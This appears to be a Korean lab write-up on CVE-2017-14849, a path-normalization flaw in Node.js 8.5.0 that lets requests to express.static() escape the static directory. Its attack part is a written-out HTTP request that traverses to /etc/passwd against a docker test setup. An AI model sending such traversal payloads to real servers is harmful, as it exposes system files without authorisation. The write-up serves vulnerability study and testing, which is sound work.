# Node.js 디렉터리 탐색 취약점(CVE-2017-14849)

## 취약점 개요

 Node js 8.5.0에서는 `파일 경로 정규화(Path Normalization)` 취약점이 있습니다. 상위 레이어(예: ../../../../../../etc/passwd)로 이동하는 중에 바르지 못한 폴더가 있는 경우 (예: ../../../foo/../../../etc/passwd) 오류가 발생해야 하지만 `파일 경로 정규화(Path Normalization)` 취약점으로 인해 `/etc/passwd`의 결과를 반환하게 됩니다.

 Express와 같은 웹 프레임워크는 일반적으로 정적 파일을 제공하기 위해 `express.static()`를 사용합니다. 이러한 함수는 내부적으로 경로 정규화를 수행하면서 디렉터리의 범위를 초과하는지 여부를 확인합니다. 그러나 Node js 8.5.0 버전의 경우 위 버그로 인해 정규화 함수가 잘못된 결과를 반환하고 디렉터리 탐색 취약점이 발생합니다.

해당 버그는 디렉터리를 단순 탐색하는 것 이상의 영향을 미칠 수 있으므로 더 깊이 조사할 필요가 있습니다. 그러나 이 취약점은 Node js 8.6.0에서 수정되었기 때문에 영향의 범위가 제한됩니다.

## 환경 실행

다음의 명령어를 통해 테스트 환경을 구성함.

```
docker compose up -d
```

`http://your-ip:3000/`으로 접속할 수 있습니다.
![1](https://github.com/junwonheo/junwonheo.github.io/assets/129061707/5dfcff9a-8a77-48d0-9238-09dc5a6c35ff)

`/static/main.js`에 정적 파일이 존재합니다. 아래와 같은 패킷을 보내겠습니다.

```
GET /static/../../../a/../../../../etc/passwd HTTP/1.1
Host: your-ip:3000
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```
![2](https://github.com/junwonheo/junwonheo.github.io/assets/129061707/2bc0b8f2-f53f-4693-890a-657f7c378317)

